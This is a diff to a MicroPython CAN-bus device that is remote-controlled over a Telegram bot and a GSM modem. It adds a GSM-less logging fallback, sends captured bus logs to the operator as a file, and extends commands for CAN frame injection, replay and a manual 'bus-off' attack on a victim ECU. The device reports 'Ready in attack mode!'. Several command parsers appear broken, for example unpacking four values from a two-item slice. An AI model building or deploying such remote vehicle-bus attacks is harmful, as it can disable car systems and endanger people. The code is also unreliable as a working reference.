@@ -19,6 +19,7 @@ class CANLogger(object):
         self.GPS_OFF = (0xB5, 0x62, 0x06, 0x04, 0x04, 0x00, 0x00, 0x00, 0x08, 0x00, 0x16, 0x74)
         self.GPS_ON = (0xB5, 0x62, 0x06, 0x04, 0x04, 0x00, 0x00, 0x00, 0x09, 0x00, 0x17, 0x76)
 
+        self.SIM_DISABLED = False
         self.GPS_LOG_TIME = 5000  # 5s
         self.SHUTOFF_TIME = 30000  # 30s of no CAN activity
         self.TOKEN = "REDACTED"
@@ -44,23 +45,27 @@ class CANLogger(object):
         self.gps = MicropyGPS()
 
         # CAN init (500 MHz)
-        self.can = CAN(1, CAN.NORMAL)
-        self.can2 = CAN(2, CAN.NORMAL)
+        self.can = CAN(1, CAN.NORMAL)  # recv
+        self.can2 = CAN(2, CAN.NORMAL)  # send
         self.can.init(CAN.NORMAL, prescaler=4, sjw=1, bs1=14, bs2=6, auto_restart=True)
         self.can2.init(CAN.NORMAL, prescaler=4, sjw=1, bs1=14, bs2=6, auto_restart=True)
         self.can.setfilter(0, CAN.MASK16, 0, (0, 0, 0, 0))
 
         # SIM800L init
-        sim_uart = UART(4, 9600, timeout=1000, read_buf_len=2048)
+        sim_uart = UART(4, 9600, timeout=1000, read_buf_len=2048 // 4)
         self.modem = Modem(sim_uart)
         self.modem.initialize()
 
-        print(self.modem.scan_networks())
-        self.modem.connect(apn="internet.eplus.de")  # FIXME check apn or set static
+        try:
+            print(self.modem.scan_networks())
+            self.modem.connect(None)
+        except:
+            self.SIM_DISABLED = True
+            print("LOG ONLY MODE (NO GSM)")
 
         # Clock init
         self.rtc = RTC()
-        self.rtc.wakeup(timeout=5000)  # wakeup call every 5s
+        self.rtc.wakeup(5000)  # wakeup call every 5s
 
         # Interrupt Flag init
         self.interrupt = False
@@ -71,10 +76,11 @@ class CANLogger(object):
         self.gsm_sleep.value(0)
 
         # Software Update
-        self.ota()
+        if not self.SIM_DISABLED:
+            self.ota()
 
-        # Telegram Bot
-        self.telegram = TelegramBot(token=self.TOKEN, modem=self.modem)
+            # Telegram Bot
+            self.telegram = TelegramBot(token=self.TOKEN, modem=self.modem)
 
     # Logs input to can.log
     # args will be separated by comma and printed each time a new line
@@ -87,8 +93,11 @@ class CANLogger(object):
             os.sync()
         else:
             # ensure we have an open file
-            if self.CAN_FILE.closed:
-                self.CAN_FILE = self.CAN_FILE = open(self.PATH + 'can.log', 'a+')
+            # if self.CAN_FILE.closed:  # closed does not exists, so seed workaround below
+            try:
+                self.CAN_FILE.read()
+            except OSError:
+                self.CAN_FILE = open(self.PATH + 'can.log', 'a+')
             print(','.join(args), file=self.CAN_FILE)
 
     # Override is working
@@ -112,6 +121,12 @@ class CANLogger(object):
         # Hangup call
         self.modem.hangup()
 
+        # Reactivate logger if called during sleep phase
+        if self.shutdown:
+            self.shutdown = False
+            self.gsm_sleep.value(0)
+            self.sendGPSCmd(self.GPS_ON)
+
         for u in self.allowed_users:
             self.telegram.send(u, 'Ready in attack mode!')
 
@@ -134,9 +149,10 @@ class CANLogger(object):
                     params = message['text'].strip().split(" ")[1:]
                     # get
                     if params[0] == 'get':
-                        with open(self.PATH + 'can.log', 'r') as f:
-                            data = f.read()  # Okay, will print \n explicitly!
-                        self.telegram.send(message[0], data)
+                        self.telegram.sendFile(message[0], open(self.PATH + 'can.log', 'rb'))
+                        # with open(self.PATH + 'can.log', 'r') as f:
+                        #    data = f.read()  # Okay, will print \n explicitly!
+                        # self.telegram.send(message[0], data)
                         os.remove(self.PATH + 'can.log')
 
                     # clear
@@ -166,23 +182,25 @@ class CANLogger(object):
                 elif message['text'] == "injection":
                     params = message['text'].split(" ")[1:]
 
-                    if len(params) < 3:
+                    if len(params) < 4:
                         self.helpMessage(message)
                         continue
 
-                    can_id, can_data, times = params[0:2]
+                    can_id, can_data, times, _delay = params[0:2]
                     for _ in times:
                         self.can2.send(can_data, can_id, timeout=1000)
-                elif message['text'] == "busoff":  # WIP feature
-                    # TODO craft own payload
-
+                        pyb.delay(_delay)
+                elif message['text'] == "reply":
+                    pass
+                    # TODO reply to a given message with another message
+                elif message['text'] == "busoff":  # TODO WIP feature only manual at that point
                     params = message['text'].strip().split(" ")[1:]
 
                     if len(params) < 4:
                         self.helpMessage(message)
                         continue
 
-                    mark_id, vic_id, payload, timeout = params[0:3]
+                    mark_id, vic_id, payload, _delay = params[0:3]
 
                     self.can.setfilter(0, CAN.LIST16, 0, (mark_id, vic_id,))
 
@@ -196,7 +214,7 @@ class CANLogger(object):
                     while count <= 5:
                         can_id, _, _, can_data = self.can.recv(0)
                         if can_id == mark_id:
-                            pyb.delay(timeout)
+                            pyb.delay(_delay)
                             self.can2.send(payload, vic_id, timeout=1000)
 
                         while True:
@@ -243,7 +261,8 @@ class CANLogger(object):
         helpme = """
                         log get|clear - Retrieve or clear saved can data log
                         replay id freq - Replay messages of given id
-                        injection id data freq - Inject given can packet into bus
+                        reply id message answer - Reply to a specified message with an answer
+                        injection id data freq delay - Inject given can packet into bus at a given frequency
                         busoff marker victim payload freq - Manual BUS off attack for given victim
                         filter add|remove|clear id - Set a filter for when logging
                         ota - Check and update newest version
@@ -272,7 +291,7 @@ class CANLogger(object):
             # Main loop
             if not self.interrupt:
                 # Free memory
-                gc.collect()
+                # gc.collect()
                 ## Logging mode ##
 
                 # Only log gps once a few seconds
